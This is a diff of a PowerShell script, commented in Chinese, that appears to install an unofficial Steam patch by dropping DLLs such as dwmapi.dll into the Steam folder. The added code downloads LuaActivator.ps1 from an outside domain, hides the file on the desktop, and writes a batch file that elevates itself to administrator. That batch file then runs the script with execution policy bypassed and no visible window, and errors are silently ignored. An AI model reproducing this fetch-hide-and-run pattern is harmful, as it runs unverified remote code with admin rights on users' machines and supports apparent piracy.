@@ -8,9 +8,10 @@ $TempZip = "$env:TEMP\steam_patch.zip"
 $TempUnzip = "$env:TEMP\steam_patch_temp"
 $CopyList = @("config","dwmapi.dll","OpenSteamTool.dll","xinput1_4.dll","steam.cfg","opensteamtool.toml")
 # 激活工具配置
-$ActivatorUrl = "https://awsteam.icu/LuaActivator.ps1"
+$ActivatorPs1Url = "https://awsteam.icu/LuaActivator.ps1"
 $DesktopPath = [Environment]::GetFolderPath("Desktop")
-$ActivatorLocalPath = Join-Path $DesktopPath "Lua补丁激活工具.ps1"
+$LocalPs1 = Join-Path $DesktopPath "LuaActivator.ps1"
+$LocalBat = Join-Path $DesktopPath "Lua补丁激活工具.bat"
 # ============================
 
 # 自动查找Steam路径
@@ -93,19 +94,34 @@ if(Test-Path $cfgFullPath){
 Remove-Item $TempZip -Force
 Remove-Item $TempUnzip -Recurse -Force
 
-# ========== 新增：下载并启动Lua激活工具 ==========
-# 下载激活工具到桌面
+# ========== 桌面释放一键激活BAT + ps1隐藏 ==========
 try{
-    $webClient.DownloadFile($ActivatorUrl, $ActivatorLocalPath)
-}catch{
-    # 下载失败不影响主流程，继续执行
-}
+    # 1. 下载核心ps1脚本到桌面
+    $webClient.DownloadFile($ActivatorPs1Url, $LocalPs1)
 
-# 自动启动激活工具（无黑框，仅显示GUI窗口）
-if(Test-Path $ActivatorLocalPath){
-    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ActivatorLocalPath`"" -Verb RunAs
+    # 2. 设置ps1文件为隐藏属性
+    if(Test-Path $LocalPs1){
+        (Get-Item $LocalPs1).Attributes += [System.IO.FileAttributes]::Hidden
+    }
+
+    # 3. 生成一键启动BAT文件到桌面
+    $batContent = @"
+@echo off
+title Lua补丁激活工具
+if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%~dp0LuaActivator.ps1"
+exit
+"@
+    [System.IO.File]::WriteAllText($LocalBat, $batContent, [System.Text.Encoding]::Default)
+
+    # 4. 自动启动激活工具
+    if(Test-Path $LocalBat){
+        Start-Process $LocalBat -Verb RunAs
+    }
+}catch{
+    # 释放失败不影响主补丁流程
 }
-# =================================================
+# ======================================================
 
 # 输出最终结果
 Write-Host "`n=====================================" -ForegroundColor Cyan
